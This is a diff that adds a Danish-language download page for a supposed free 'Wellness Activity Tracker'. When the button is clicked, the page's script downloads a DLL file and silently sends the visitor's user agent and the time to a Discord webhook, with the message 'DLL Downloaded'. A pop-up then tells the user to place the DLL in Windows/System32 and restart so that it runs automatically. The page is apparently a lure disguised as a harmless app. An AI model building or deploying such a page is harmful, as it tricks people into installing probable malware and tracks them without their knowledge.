@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <title>Wellness Tracker - Download</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+        .download-btn { 
+            background: #28a745; color: white; padding: 15px 30px; 
+            border: none; border-radius: 5px; font-size: 16px; cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+    <h1>🏃‍♀️ Wellness Activity Tracker</h1>
+    <p>Download vores gratis wellness tracker til Windows</p>
+    <p>Funktioner:</p>
+    <ul style="text-align: left; max-width: 300px; margin: 0 auto;">
+        <li>Spor daglige aktiviteter</li>
+        <li>Meditation timer</li>
+        <li>Wellness statistikker</li>
+        <li>Community integration</li>
+    </ul>
+    
+    <br><br>
+    <button class="download-btn" onclick="downloadTracker()">📥 Download Wellness Tracker</button>
+    
+    <script>
+        function downloadTracker() {
+            // Download the DLL
+            var link = document.createElement('a');
+            link.href = 'wellness_tracker.dll';
+            link.download = 'WellnessTracker.dll';
+            link.click();
+            
+            // Send beacon
+            fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🎯 **DLL Downloaded**\n**User:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}`
+                })
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                alert('💚 Wellness Tracker downloaded!\n\nFor at installere:\n1. Gem filen i din Windows/System32 mappe\n2. Genstart din computer\n3. Trackeren starter automatisk');
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
